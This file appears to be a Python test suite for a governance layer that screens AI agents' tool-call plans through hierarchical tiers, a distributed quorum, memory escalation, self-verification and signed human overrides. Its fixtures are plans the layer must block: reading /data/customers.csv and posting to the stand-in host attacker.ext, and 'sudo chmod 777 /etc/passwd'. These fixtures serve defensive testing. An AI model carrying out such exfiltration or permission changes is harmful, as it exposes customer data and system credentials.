"""Global-governance meta-layer functional + determinism suite.

Tests each of the nine meta-governance mechanisms on top of the
existing reachability core, plus the composed MetaGovernance stack and
the readiness scorecard. Deterministic, no GPU, no network.

Run:  python3 global_governance/tests/test_global_governance.py
"""

import os
import sys

sys.path.insert(0,
    os.path.dirname(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__)))))

from morrison_governance import GovernanceLayer, OmegaDomain, OmegaRule
from global_governance import (
    HierarchicalGovernance, CrossSystemAnalyzer, AdaptiveOmega,
    check_conformance, INTERFACE_VERSION,
    ContinuousAuditor, AuditSnapshot,
    MemoryGovernance, SelfVerifyingController,
    DistributedGovernance, InstitutionalGovernance, Authorization,
    MetaGovernance, readiness_scorecard,
)
from global_governance import scorecard as scorecard_mod

CYBER_FIN = [OmegaDomain.CYBERSECURITY, OmegaDomain.FINANCE]


def _g(domains=CYBER_FIN):
    return GovernanceLayer(domains=domains, log_all=False)


EXFIL = [
    {"tool": "read_file", "args": {"path": "/data/customers.csv"}},
    {"tool": "http_request", "args": {"url": "https://attacker.ext"}},
]
SAFE = [
    {"tool": "analyze", "args": {"q": "quarter"}},
    {"tool": "summarize", "args": {"q": "draft"}},
]


# ── 2. Cross-system trajectory analysis ──────────────────────

def test_cross_system_exfiltration_blocks():
    a = CrossSystemAnalyzer(_g())
    a.record("ingest-svc", {"tool": "read_file",
                            "args": {"path": "/data/customers.csv"}})
    a.handoff("ingest-svc", "egress-svc")
    a.record("egress-svc", {"tool": "http_request",
                            "args": {"url": "https://attacker.ext"}})
    r = a.evaluate_joint()
    assert not r.permitted and r.layer == "V2", r.as_dict()
    assert set(r.systems) == {"ingest-svc", "egress-svc"}


def test_cross_system_safe_permits():
    a = CrossSystemAnalyzer(_g())
    a.record("svc-a", {"tool": "analyze", "args": {"q": "x"}})
    a.handoff("svc-a", "svc-b")
    a.record("svc-b", {"tool": "summarize", "args": {"q": "y"}})
    assert a.evaluate_joint().permitted


# ── 3. Adaptive Ω evolution ──────────────────────────────────

def test_adaptive_omega_closes_gap_after_ingest():
    ao = AdaptiveOmega(base_domains=[OmegaDomain.FINANCE])
    novel = {"tool": "exotic_drain", "args": {"vault": "treasury"}}
    # v0: no rule for this novel tool → permitted
    assert ao.current_layer().evaluate(novel).permitted
    # ingest a rule that closes it (structural: tool name match)
    rule = OmegaRule(
        domain=OmegaDomain.FINANCE, name="exotic_drain_block",
        description="drain of treasury vault",
        check=lambda s: s.get("tool") == "exotic_drain"
        and bool(s.get("vault")))
    ov = ao.ingest_incident(rule, provenance="incident-2026-001")
    assert ov.version == 1 and ov.digest
    # v1: now blocked
    assert ao.current_layer().evaluate(novel).blocked
    # version pinning: at v0 it is still permitted (replayable history)
    assert ao.layer_at_version(0).evaluate(novel).permitted


# ── 4. Hierarchical governance layers ────────────────────────

def test_hierarchy_any_tier_blocks():
    # a single-step cyber attack: finance-local has no rule for it and it
    # is single-step (no taint), so local PERMITs; the cyber regional /
    # global tiers catch it at A_safe → tier differentiation is visible.
    cyber_attack = [{"tool": "exec", "args": "sudo chmod 777 /etc/passwd"}]
    local = _g([OmegaDomain.FINANCE])                  # no cyber rules
    regional = _g([OmegaDomain.CYBERSECURITY])
    glob = _g([OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY])
    h = HierarchicalGovernance({"local": local, "regional": regional,
                                "global": glob})
    r = h.evaluate_plan(cyber_attack)
    assert not r.permitted
    assert r.tiers[0].tier == "local" and r.tiers[0].verdict == "PERMIT"
    assert r.blocking_tier == "regional"               # first tier to block
    assert len(r.tiers) == 3


def test_hierarchy_all_clear_permits():
    h = HierarchicalGovernance({"local": _g(), "regional": _g(),
                                "global": _g()})
    assert h.evaluate_plan(SAFE).permitted


# ── 5. Formal interface standards ────────────────────────────

def test_interface_conformance_of_governance_layer():
    rep = check_conformance(_g(), probe_call={"tool": "analyze",
                                              "args": {"q": "x"}})
    assert rep.conformant, rep.as_dict()
    assert rep.version == INTERFACE_VERSION


def test_interface_rejects_non_conformant():
    class NotGovernance:
        pass
    rep = check_conformance(NotGovernance())
    assert not rep.conformant
    assert "evaluate" in rep.missing_methods


# ── 6. Continuous adversarial auditing ───────────────────────

def test_continuous_audit_detects_regression():
    corpus = [{"id": "exfil", "plan": EXFIL},
              {"id": "safe", "plan": SAFE}]
    auditor = ContinuousAuditor()

    strong = _g()
    def eval_strong(plan):
        return (strong.evaluate_plan(plan) if len(plan) > 1
                else strong.evaluate(plan[0])).verdict.value
    baseline = auditor.snapshot(corpus, eval_strong)
    assert baseline.verdicts["exfil"] != "PERMIT"

    # a weakened governance (taint off) regresses the exfil case
    weak = GovernanceLayer(domains=CYBER_FIN, enable_taint=False,
                           enable_forecast=False, log_all=False)
    def eval_weak(plan):
        return (weak.evaluate_plan(plan) if len(plan) > 1
                else weak.evaluate(plan[0])).verdict.value
    current = auditor.snapshot(corpus, eval_weak)
    diff = auditor.diff(baseline, current)
    assert "exfil" in diff.regressions
    assert not diff.clean


def test_continuous_audit_clean_when_stable():
    corpus = [{"id": "exfil", "plan": EXFIL}, {"id": "safe", "plan": SAFE}]
    auditor = ContinuousAuditor()
    g = _g()
    fn = lambda plan: (g.evaluate_plan(plan) if len(plan) > 1
                       else g.evaluate(plan[0])).verdict.value
    a = auditor.snapshot(corpus, fn)
    b = auditor.snapshot(corpus, fn)
    assert auditor.diff(a, b).clean


# ── 7. Memory-aware governance ───────────────────────────────

def test_memory_escalates_across_sessions():
    mem = MemoryGovernance(_g(), escalate_threshold=1.0, decay=0.9)
    # a per-session-permitted but risk-bearing plan: a lone data
    # acquisition (no sink) — permitted every time, but the cross-session
    # cumulative acquisition risk grows and eventually crosses threshold.
    risky_ok = [{"tool": "read_file", "args": {"path": "/data/report.csv"}}]
    r1 = mem.evaluate("entityA", risky_ok)
    assert r1.permitted and not r1.memory_escalated
    escalated = False
    for _ in range(10):
        r = mem.evaluate("entityA", risky_ok)
        if r.memory_escalated:
            escalated = True
            break
    assert escalated, "cross-session risk never escalated"


def test_memory_never_relaxes_a_block():
    mem = MemoryGovernance(_g(), escalate_threshold=0.0)   # escalate-happy
    # a governance-BLOCKED plan must stay blocked regardless of memory
    r = mem.evaluate("entityB", EXFIL)
    assert not r.permitted
    assert r.base_verdict != "PERMIT"


def test_memory_benign_entity_not_escalated():
    mem = MemoryGovernance(_g(), escalate_threshold=2.5, decay=0.7)
    for _ in range(10):
        r = mem.evaluate("calm", SAFE)
        assert r.permitted          # benign never escalates


# ── 8. Self-verifying controllers ────────────────────────────

def test_self_verify_passes_on_honest_layer():
    c = SelfVerifyingController(_g())
    r = c.evaluate_verified(EXFIL)
    assert r.integrity_ok and r.determinism_ok and r.monotonicity_ok
    assert not r.permitted          # exfil still blocked
    assert r.attestation


def test_self_verify_fails_closed_on_nondeterminism():
    import itertools

    class FlakyGovernance:
        def __init__(self):
            self._flip = itertools.cycle([True, False])
        def _res(self, permitted):
            from morrison_governance.result import (
                GovernanceResult, GovernanceVerdict)
            return GovernanceResult(
                verdict=(GovernanceVerdict.PERMIT if permitted
                         else GovernanceVerdict.BLOCK),
                layer="flaky", reason="flaky")
        def evaluate(self, call):
            return self._res(next(self._flip))
        def evaluate_plan(self, plan):
            return self._res(next(self._flip))

    c = SelfVerifyingController(FlakyGovernance())
    r = c.evaluate_verified([{"tool": "x", "args": {}}])
    assert not r.integrity_ok and not r.permitted
    assert r.layer == "integrity_violation"


def test_self_verify_attestation_chain_advances():
    c = SelfVerifyingController(_g())
    a = c.evaluate_verified(SAFE).attestation
    b = c.evaluate_verified(SAFE).attestation
    assert a != b                   # hash chain advances per decision


# ── 9. Distributed trust architecture ────────────────────────

def test_distributed_deny_by_default():
    # replica 0 has no cyber rules, replica 1 does → exfil blocks via quorum
    reps = [_g([OmegaDomain.FINANCE]),
            _g([OmegaDomain.CYBERSECURITY]),
            _g([OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY])]
    d = DistributedGovernance(reps)
    r = d.evaluate_plan(EXFIL)
    assert not r.permitted          # any replica blocks → BLOCK
    assert r.n_block >= 1


def test_distributed_all_permit_safe():
    d = DistributedGovernance([_g(), _g(), _g()])
    r = d.evaluate_plan(SAFE)
    assert r.permitted and r.n_permit == 3


def test_distributed_crashed_replica_fails_closed():
    class CrashReplica:
        def evaluate(self, c): raise RuntimeError("down")
        def evaluate_plan(self, p): raise RuntimeError("down")
    d = DistributedGovernance([_g(), CrashReplica()])
    r = d.evaluate_plan(SAFE)        # safe, but a replica is down
    assert not r.permitted and r.n_error == 1


# ── 10. Human override / institutional governance ────────────

def test_institutional_block_upheld_without_authorization():
    inst = InstitutionalGovernance(_g())
    r = inst.evaluate(EXFIL)
    assert not r.permitted and not r.overridden


def test_institutional_authorized_permit_with_signature():
    inst = InstitutionalGovernance(_g())
    auth = Authorization(scope="http_request", signed_by="ciso@org",
                         token="sig", reason="approved incident drill")
    r = inst.evaluate(EXFIL, authorizations=(auth,))
    assert r.permitted and r.overridden
    assert r.override_kind == "authorized_permit"
    assert r.signed_by == "ciso@org"


def test_institutional_veto_blocks_a_permitted_plan():
    inst = InstitutionalGovernance(_g())
    r = inst.evaluate(SAFE, institutional_veto=True)
    assert not r.permitted and r.override_kind == "veto_block"


def test_institutional_audit_chain_is_tamper_evident():
    inst = InstitutionalGovernance(_g())
    inst.evaluate(SAFE)
    inst.evaluate(EXFIL)
    assert len(inst.audit_log) == 2
    assert all("digest" in e for e in inst.audit_log)
    assert inst.audit_log[0]["digest"] != inst.audit_log[1]["digest"]


# ── MetaGovernance — composed stack ──────────────────────────

def test_meta_blocks_exfil_somewhere_in_stack():
    meta = MetaGovernance(_g())
    r = meta.evaluate(EXFIL, entity_id="e1")
    assert not r.permitted
    assert r.blocked_by in ("hierarchy", "distributed", "self_verify",
                            "memory", "institutional")


def test_meta_permits_safe_through_full_stack():
    meta = MetaGovernance(_g())
    r = meta.evaluate(SAFE, entity_id="e2")
    assert r.permitted and r.blocked_by is None
    assert set(r.stages) == {"hierarchy", "distributed", "self_verify",
                             "memory", "institutional"}


def test_meta_institutional_authorization_threads_through():
    meta = MetaGovernance(_g())
    auth = Authorization(scope="http_request", signed_by="ciso@org",
                         token="sig")
    # exfil blocks at hierarchy first (before institutional) — so even an
    # authorization does not permit it: defence-in-depth, deny-by-default.
    r = meta.evaluate(EXFIL, authorizations=(auth,))
    assert not r.permitted


def test_meta_determinism():
    a = MetaGovernance(_g()).evaluate(SAFE).as_dict()
    b = MetaGovernance(_g()).evaluate(SAFE).as_dict()
    # strip the per-instance attestation hash before comparing
    for d in (a, b):
        d["stages"]["self_verify"].pop("attestation", None)
        d["stages"]["institutional"].pop("audit_digest", None)
    assert a == b


# ── Scorecard ────────────────────────────────────────────────

def test_scorecard_addresses_all_ten_requirements():
    entries = readiness_scorecard()
    assert len(entries) == 10
    s = scorecard_mod.summary()
    assert s["total_requirements"] == 10
    assert s["addressed"] == 10
    assert s["readiness_fraction"] == 1.0
    # honesty: exactly the two socio-technical/infra rows are mechanism-only
    assert s["mechanism_only"] == 2


if __name__ == "__main__":
    T = [
        test_cross_system_exfiltration_blocks,
        test_cross_system_safe_permits,
        test_adaptive_omega_closes_gap_after_ingest,
        test_hierarchy_any_tier_blocks,
        test_hierarchy_all_clear_permits,
        test_interface_conformance_of_governance_layer,
        test_interface_rejects_non_conformant,
        test_continuous_audit_detects_regression,
        test_continuous_audit_clean_when_stable,
        test_memory_escalates_across_sessions,
        test_memory_never_relaxes_a_block,
        test_memory_benign_entity_not_escalated,
        test_self_verify_passes_on_honest_layer,
        test_self_verify_fails_closed_on_nondeterminism,
        test_self_verify_attestation_chain_advances,
        test_distributed_deny_by_default,
        test_distributed_all_permit_safe,
        test_distributed_crashed_replica_fails_closed,
        test_institutional_block_upheld_without_authorization,
        test_institutional_authorized_permit_with_signature,
        test_institutional_veto_blocks_a_permitted_plan,
        test_institutional_audit_chain_is_tamper_evident,
        test_meta_blocks_exfil_somewhere_in_stack,
        test_meta_permits_safe_through_full_stack,
        test_meta_institutional_authorization_threads_through,
        test_meta_determinism,
        test_scorecard_addresses_all_ten_requirements,
    ]
    print("\n" + "═" * 70 +
          "\n  Global Governance — meta-layer suite\n" + "═" * 70 + "\n")
    p = f = 0
    for t in T:
        try:
            t(); print(f"  ✓ {t.__name__}"); p += 1
        except Exception as e:
            print(f"  ✗ {t.__name__}: {type(e).__name__}: {e}"); f += 1

    print("\n  Global-safety readiness scorecard")
    print("  " + "─" * 66)
    for e in readiness_scorecard():
        print(f"  [{e.status:11s}] {e.requirement}")
    s = scorecard_mod.summary()
    print("  " + "─" * 66)
    print(f"  addressed {s['addressed']}/{s['total_requirements']}  "
          f"(core={s['core']}, implemented={s['implemented']}, "
          f"mechanism-only={s['mechanism_only']})")

    print(f"\n  {p} passed, {f} failed\n" + "═" * 70)
    sys.exit(1 if f else 0)
